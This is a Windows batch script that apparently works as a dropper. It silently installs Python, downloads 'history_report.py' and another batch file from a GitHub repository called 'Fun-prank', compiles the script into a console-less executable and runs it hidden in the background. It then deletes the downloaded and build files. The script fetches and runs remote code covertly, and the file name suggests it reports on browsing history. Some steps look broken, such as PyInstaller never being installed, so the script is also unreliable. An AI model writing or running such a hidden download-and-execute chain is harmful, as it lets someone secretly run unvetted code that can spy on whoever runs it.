@echo off
:: Step 1: Check if Python is installed
where python >nul 2>nul
if %errorlevel% neq 0 (
    echo Python is not installed. Installing Python silently...
    powershell -Command "Start-Process 'https://www.python.org/ftp/python/3.9.9/python-3.9.9-amd64.exe' -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -NoNewWindow -Wait"
)

:: Step 2: Install pip if not installed
where pip >nul 2>nul
if %errorlevel% neq 0 (
    echo pip is not installed. Installing pip silently...
    python -m ensurepip --upgrade
)

:: Step 3: Install necessary Python libraries from requirements.txt
echo Installing necessary libraries from requirements.txt...
echo requests > requirements.txt
echo psutil >> requirements.txt
echo gpuinfo >> requirements.txt
python -m pip install -r requirements.txt

:: Step 4: Check if requests library is installed
python -c "import requests" >nul 2>nul
if %errorlevel% neq 0 (
    echo Requests installation failed. Exiting...
    pause
    exit /b
)

:: Step 5: Download the Python script from GitHub
echo Downloading Python script...
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/history_report.py -OutFile history_report.py"

:: Step 6: Download the .bat file for running silently
echo Downloading .bat file for running silently...
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/install_run_silent.bat -OutFile install_run_silent.bat"

:: Step 7: Check if the Python script exists
if not exist "history_report.py" (
    echo Script file not found. Please make sure history_report.py is in the same folder as this batch file.
    pause
    exit /b
)

:: Step 8: Convert the Python script to an executable using PyInstaller with explicit imports
echo Converting script to executable...
pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=psutil --hidden-import=gpuinfo history_report.py

:: Step 9: Check if the executable was created
if not exist "dist\history_report.exe" (
    echo Failed to create executable. Exiting...
    pause
    exit /b
)

:: Step 10: Run the executable silently
echo Running the executable silently...
start /B dist\history_report.exe

:: Step 11: Clean up PyInstaller files (optional)
echo Cleaning up PyInstaller files...
rd /s /q "build"
del /q "history_report.spec"

:: Step 12: Clean up the downloaded files
if exist "install_run_silent.bat" (
    del install_run_silent.bat
)

del history_report.py
del requirements.txt
pause
